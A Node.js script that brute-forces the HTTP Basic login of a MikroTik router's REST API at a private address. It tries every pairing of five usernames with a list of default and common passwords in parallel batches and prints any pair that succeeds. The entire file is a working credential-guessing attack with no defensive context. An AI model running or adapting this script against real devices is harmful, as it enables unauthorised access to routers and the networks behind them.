const http = require('http');

const HOST = '192.168.88.1';
const passwords = [
  '', ' ', 'password', 'password ', ' password', 'password\n', 'password\r\n',
  'Password', 'PASSWORD', 'admin', 'Admin', 'ADMIN', 'admin1',
  '1234', '12345', '123456', '1234567', '12345678',
  'mikrotik', 'MikroTik', 'MIKROTIK', 'Mikrotik',
  'changeme', 'default', 'pass', 'root', 'test', 'guest',
  'letmein', 'welcome', 'monkey', 'master', 'qwerty',
  'abc123', 'iloveyou', 'trustno1', 'dragon',
  'router', 'Router', 'hotspot', 'Hotspot',
  'internet', 'Internet', 'wifi', 'WiFi', 'wireless',
  'password1', 'password123', 'pass123', 'pass1234',
  'admin123', 'admin1234', 'test123',
  'your_jwt_secret_here', 'postgres',
  'password\r', '\npassword', 'password\t',
];

const users = ['admin', 'Admin', 'root', 'user', 'guest'];

let found = false;
let pending = 0;
let tried = 0;
const total = users.length * passwords.length;

function tryLogin(user, pass) {
  return new Promise((resolve) => {
    const cred = Buffer.from(`${user}:${pass}`).toString('base64');
    const req = http.request({
      hostname: HOST, port: 80,
      path: '/rest/system/identity',
      method: 'GET',
      headers: { 'Authorization': `Basic ${cred}` },
      timeout: 3000
    }, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        tried++;
        if (res.statusCode === 200) {
          console.log(`\n*** SUCCESS *** user="${user}" pass="${pass}" => ${body}`);
          found = true;
        }
        resolve();
      });
    });
    req.on('error', () => { tried++; resolve(); });
    req.on('timeout', () => { tried++; req.destroy(); resolve(); });
    req.end();
  });
}

async function run() {
  console.log(`Testing ${total} combinations against ${HOST}...`);
  
  for (const user of users) {
    for (let i = 0; i < passwords.length; i += 5) {
      if (found) return;
      const batch = passwords.slice(i, i + 5).map(p => tryLogin(user, p));
      await Promise.all(batch);
      process.stdout.write(`\r${tried}/${total} tried...`);
    }
  }
  
  if (!found) {
    console.log(`\n\nAll ${tried} combinations failed.`);
    console.log('The password is something non-standard.');
  }
}

run();
